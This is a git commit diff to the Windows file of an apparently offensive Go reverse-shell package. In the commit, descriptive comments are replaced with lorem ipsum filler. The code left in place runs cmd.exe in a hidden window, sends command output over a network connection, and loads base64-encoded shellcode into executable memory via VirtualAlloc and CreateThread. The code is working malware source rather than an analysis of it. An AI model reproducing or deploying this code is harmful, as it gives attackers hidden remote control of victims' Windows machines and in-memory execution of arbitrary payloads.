6df26ffcf6343e1ae6f601a580ba2e88b41cc3d9
0xc0ffeee <35871757+0xc0ffeee@users.noreply.github.com>
2020-09-17 11:38:20 -0400

    Update shell_windows.go

--- shell/shell_windows.go
+++ shell/shell_windows.go
@@ -1,4 +1,4 @@
-// +build windows !linux !darwin !freebsd
+//  Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer aliquet feugiat gravida. Nam mollis venenatis libero et interdum. Quisque in dolor ultrices, pulvinar diam ac, lobortis dolor. Phasellus consequat rutrum arcu, sit amet lobortis justo commodo quis. Sed luctus at elit sit amet congue. Phasellus convallis enim eu blandit dapibus. Vestibulum ex leo, ultricies sed mattis sed, tincidunt et odio. Pellentesque dictum tristique massa ac feugiat. 
 
 package shell
 
@@ -15,16 +15,14 @@ const (
 	MEM_RESERVE = 0x2000
 )
 
-// GetShell pops an *exec.Cmd and return it to be used in a reverse shell
+// G Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer aliquet feugiat gravida. Nam mollis venenatis libero et interdum. Quisque in dolor ultrices, pulvinar diam ac, lobortis dolor. Phasellus consequat rutrum arcu, sit amet lobortis justo commodo quis. Sed luctus at elit sit amet congue. Phasellus convallis enim eu blandit dapibus. Vestibulum ex leo, ultricies sed mattis sed, tincidunt et odio. Pellentesque dictum tristique massa ac feugiat. 
 func GetShell() *exec.Cmd {
-	//cmd := exec.Command("C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe")
 	cmd := exec.Command("C:\\Windows\\System32\\cmd.exe")
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	return cmd
 }
 
-// ExecuteCmd runs the provided command through cmd.exe
-// and redirects the result to the provided net.Conn object.
+// Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer aliquet feugiat gravida. Nam mollis venenatis libero et interdum. Quisque in dolor ultrices, pulvinar diam ac, lobortis dolor. Phasellus consequat rutrum arcu, sit amet lobortis justo commodo quis. Sed luctus at elit sit amet congue. Phasellus convallis enim eu blandit dapibus. Vestibulum ex leo, ultricies sed mattis sed, tincidunt et odio. Pellentesque dictum tristique massa ac feugiat. 
 func ExecuteCmd(command string, conn net.Conn) {
 	//cmd_path := "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"
 	cmd_path := "C:\\Windows\\System32\\cmd.exe"
@@ -35,7 +33,7 @@ func ExecuteCmd(command string, conn net.Conn) {
 	cmd.Run()
 }
 
-// InjectShellcode decodes a base64 encoded shellcode and calls ExecShellcode on the decode value.
+//  Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer aliquet feugiat gravida. Nam mollis venenatis libero et interdum. Quisque in dolor ultrices, pulvinar diam ac, lobortis dolor. Phasellus consequat rutrum arcu, sit amet lobortis justo commodo quis. Sed luctus at elit sit amet congue. Phasellus convallis enim eu blandit dapibus. Vestibulum ex leo, ultricies sed mattis sed, tincidunt et odio. Pellentesque dictum tristique massa ac feugiat. 
 func InjectShellcode(encShellcode string) {
 	if encShellcode != "" {
 		if shellcode, err := base64.StdEncoding.DecodeString(encShellcode); err == nil {
@@ -44,18 +42,16 @@ func InjectShellcode(encShellcode string) {
 	}
 }
 
-// ExecShellcode maps a memory page as RWX, copies the provided shellcode to it
-// and executes it via a syscall.Syscall call.
+//  Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer aliquet feugiat gravida. Nam mollis venenatis libero et interdum. Quisque in dolor ultrices, pulvinar diam ac, lobortis dolor. Phasellus consequat rutrum arcu, sit amet lobortis justo commodo quis. Sed luctus at elit sit amet congue. Phasellus convallis enim eu blandit dapibus. Vestibulum ex leo, ultricies sed mattis sed, tincidunt et odio. Pellentesque dictum tristique massa ac feugiat. 
 func ExecShellcode(shellcode []byte) {
 	// Resolve kernell32.dll, and VirtualAlloc
 	kernel32 := syscall.MustLoadDLL("kernel32.dll")
 	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
 	procCreateThread := kernel32.MustFindProc("CreateThread")
-	// Reserve space to drop shellcode
 	address, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, syscall.PAGE_EXECUTE_READWRITE)
-	// Ugly, but works
+	// LOLZ
 	addrPtr := (*[990000]byte)(unsafe.Pointer(address))
-	// Copy shellcode
+	// LOLZWUT
 	for i, value := range shellcode {
 		addrPtr[i] = value
 	}
